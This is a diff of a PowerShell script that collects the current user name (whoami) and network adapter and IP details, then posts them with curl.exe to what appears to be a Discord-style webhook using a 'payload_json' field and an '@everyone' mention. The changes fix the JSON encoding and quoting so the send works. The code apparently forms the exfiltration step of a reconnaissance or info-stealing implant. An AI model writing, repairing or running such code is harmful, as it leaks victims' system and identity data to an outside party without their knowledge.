@@ -35,12 +35,15 @@ $networkInfo = (Get-NetAdapter | ForEach-Object { $a=$_; $ips=Get-NetIPAddress -
 
 
 $whoami_content = whoami
-$payload = [System.Text.Json.JsonSerializer]::Serialize(@{
-    content = "@everyone: $whoami_content | $networkInfo"
-})
+$payload = @{
+  content = "@everyone: $whoami_content | $networkInfo"
+} | ConvertTo-Json -Compress
 
-# remove newlines just in case
+# Remove newlines from $networkInfo (they break JSON)
 $payload = $payload -replace "\r?\n"," "
+
+# Wrap payload in quotes so curl sends it AS JSON STRING
+$payload = '"' + $payload.Replace('"', '\"') + '"'
 
 & curl.exe -X POST `
   -F "payload_json=$payload" `
